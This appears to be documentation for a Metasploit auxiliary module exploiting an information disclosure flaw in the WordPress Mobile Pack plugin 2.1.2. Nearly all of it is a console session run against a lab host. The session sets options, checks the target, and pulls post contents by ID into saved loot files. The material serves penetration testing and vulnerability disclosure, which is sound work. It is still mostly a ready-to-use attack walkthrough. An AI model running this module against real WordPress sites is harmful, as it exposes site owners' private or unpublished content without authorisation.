#### Add Wordpress Plugin Mobile Pack Information Disclosure Vulnerability.

  Application: Wordpress Plugin 'Mobile Pack' 2.1.2
  Homepage: https://wordpress.org/plugins/wordpress-mobile-pack/
  Source Code: https://downloads.wordpress.org/plugin/wordpress-mobile-pack.2.1.2.zip
  Active Installs (wordpress.org): 30,000+
  References: https://wpvulndb.com/vulnerabilities/8107

#### Vulnerable packages*
        
  2.1.2
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS):
```
msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf>  use auxiliary/scanner/http/wp_mobile_pack_info_disclosure 
msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf> auxiliary(wp_mobile_pack_info_disclosure)  show options 

Module options (auxiliary/scanner/http/wp_mobile_pack_info_disclosure):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   POSTID     1                yes       The post identification to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host

msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf> auxiliary(wp_mobile_pack_info_disclosure)  info

       Name: WordPress Mobile Pack Information Disclosure Vulnerability
     Module: auxiliary/scanner/http/wp_mobile_pack_info_disclosure
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Nitin Venkatesh
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  POSTID     1                yes       The post identification to read
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /                yes       The base path to the wordpress application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module exploits a information disclosure vulnerability in 
  WordPress Plugin "WP Mobile Pack" version 2.1.2, allowing to read 
  files with privileges informations.

References:
  https://wpvulndb.com/vulnerabilities/8107
  https://packetstormsecurity.com/files/132750/

msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf> auxiliary(wp_mobile_pack_info_disclosure)  set RHOSTS 192.168.1.63
RHOSTS => 192.168.1.63
msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf> auxiliary(wp_mobile_pack_info_disclosure)  check
[*] 192.168.1.63:80 - The target appears to be vulnerable.
[*] Checked 1 of 1 hosts (100% complete)
msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf> auxiliary(wp_mobile_pack_info_disclosure)  run

[+] 192.168.1.63:80 - File saved in: /home/espreto/.msf4/loot/20150804035032_default_192.168.1.63_mobilepack.discl_694322.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf> auxiliary(wp_mobile_pack_info_disclosure)  head /home/espreto/.msf4/loot/20150804035032_default_192.168.1.63_mobilepack.discl_694322.txt
[*] exec: head /home/espreto/.msf4/loot/20150804035032_default_192.168.1.63_mobilepack.discl_694322.txt

{
  "article": {
    "id": 1,
    "title": "Hello world!",
    "timestamp": 1428868888,
    "author": "espreto",
    "date": "Sun, Apr 12, 2015, 20:01",
    "link": "http://localhost/?p=1",
    "image": "",
    "description": "<p>Welcome to WordPress. This is your first post. Edit or delete it, then start blogging!</p>\n",
msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf> auxiliary(wp_mobile_pack_info_disclosure)  set VERBOSE true
VERBOSE => true
msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf> auxiliary(wp_mobile_pack_info_disclosure)  run

[*] Enumerating...
[+] Found:

{
  "article": {
    "id": 1,
    "title": "Hello world!",
    "timestamp": 1428868888,
    "author": "espreto",
    "date": "Sun, Apr 12, 2015, 20:01",
    "link": "http://localhost/?p=1",
    "image": "",
    "description": "<p>Welcome to WordPress. This is your first post. Edit or delete it, then start blogging!</p>\n",
    "content": "<p>Welcome to WordPress. This is your first post. Edit or delete it, then start blogging!</p>\n",
    "comment_status": "open",
    "no_comments": 0,
    "show_avatars": true,
    "require_name_email": true,
    "category_id": 1,
    "category_name": "Uncategorized",
    "related_posts": "",
    "related_web_posts": "",
    "zemanta": false
  }
}

[+] 192.168.1.63:80 - File saved in: /home/espreto/.msf4/loot/20150804035053_default_192.168.1.63_mobilepack.discl_362157.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf> auxiliary(wp_mobile_pack_info_disclosure)  set POSTID 132
POSTID => 132
msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf> auxiliary(wp_mobile_pack_info_disclosure)  run

[*] Enumerating...
[+] Found:

{
  "article": {
    "id": 132,
    "title": "Testing post",
    "timestamp": 1438664560,
    "author": "espreto",
    "date": "Tue, Aug 04, 2015, 05:02",
    "link": "http://localhost/?p=132",
    "image": "",
    "description": "<p>This is just a comment. Get out of here! Hihihi!</p>\n",
    "content": "<p>This is just a comment. Get out of here! Hihihi!</p>\n",
    "comment_status": "open",
    "no_comments": 0,
    "show_avatars": true,
    "require_name_email": true,
    "category_id": 1,
    "category_name": "Uncategorized",
    "related_posts": "",
    "related_web_posts": "",
    "zemanta": false
  }
}

[+] 192.168.1.63:80 - File saved in: /home/espreto/.msf4/loot/20150804035102_default_192.168.1.63_mobilepack.discl_130718.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf> auxiliary(wp_mobile_pack_info_disclosure)
```
